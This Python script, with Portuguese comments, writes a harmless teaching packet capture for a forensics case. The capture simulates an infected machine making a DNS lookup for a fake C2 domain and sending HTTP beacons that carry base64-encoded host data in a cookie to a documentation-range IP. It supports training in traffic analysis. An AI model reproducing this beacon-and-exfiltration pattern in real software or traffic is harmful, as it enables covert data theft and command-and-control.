#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Gera a amostra didatica do Caso 015: uma CAPTURA DE REDE (.pcap) INOFENSIVA.
#
# Simula o trafego de uma maquina infectada: uma consulta DNS para o C2, e
# "beacons" HTTP que exfiltram dados num cookie codificado em base64. Nenhum
# pacote e enviado; e so um arquivo .pcap para abrir no tshark/Wireshark.
import struct
import socket
import base64

VICTIM = "192.168.56.101"
DNS_SRV = "192.168.56.1"
C2_IP = "203.0.113.10"          # faixa de documentacao (TEST-NET-3), inofensiva
DOMAIN = "patch-cdn.ddns.net"
EXFIL = base64.b64encode(b"user=admin;host=FIN-PC;os=win10").decode()

MAC_A = b"\x02\x00\x00\x00\x00\x01"
MAC_B = b"\x02\x00\x00\x00\x00\x02"


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


def ipv4(src, dst, proto, payload, ident):
    total = 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, 0, 64, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    chk = checksum(hdr)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, 0, 64, proto, chk,
                      socket.inet_aton(src), socket.inet_aton(dst))
    return hdr + payload


def udp(sp, dp, payload):
    return struct.pack("!HHHH", sp, dp, 8 + len(payload), 0) + payload


def tcp(sp, dp, seq, ack, flags, payload=b""):
    return struct.pack("!HHIIBBHHH", sp, dp, seq, ack, (5 << 4), flags, 65535, 0, 0) + payload


def eth(src, dst, ethertype, payload):
    return dst + src + struct.pack("!H", ethertype) + payload


def dns_query(name):
    hdr = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    q = b"".join(struct.pack("B", len(p)) + p.encode() for p in name.split(".")) + b"\x00"
    q += struct.pack("!HH", 1, 1)   # tipo A, classe IN
    return hdr + q


def http_beacon():
    return (
        "GET /beacon?v=1 HTTP/1.1\r\n"
        "Host: " + DOMAIN + "\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)\r\n"
        "Cookie: data=" + EXFIL + "\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode()


pacotes = [
    eth(MAC_A, MAC_B, 0x0800, ipv4(VICTIM, DNS_SRV, 17, udp(51000, 53, dns_query(DOMAIN)), 1)),
    eth(MAC_A, MAC_B, 0x0800, ipv4(VICTIM, C2_IP, 6, tcp(49200, 80, 1000, 1, 0x18, http_beacon()), 2)),
    eth(MAC_A, MAC_B, 0x0800, ipv4(VICTIM, C2_IP, 6, tcp(49201, 80, 2000, 1, 0x18, http_beacon()), 3)),
]


def pcap_bytes():
    out = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)   # Ethernet
    for i, p in enumerate(pacotes):
        out += struct.pack("<IIII", 1700000000 + i * 600, 0, len(p), len(p)) + p
    return out


with open("captura.pcap", "wb") as f:
    f.write(pcap_bytes())

print("gerado captura.pcap (%d pacotes). C2: %s, exfil no cookie (base64)." % (len(pacotes), DOMAIN))
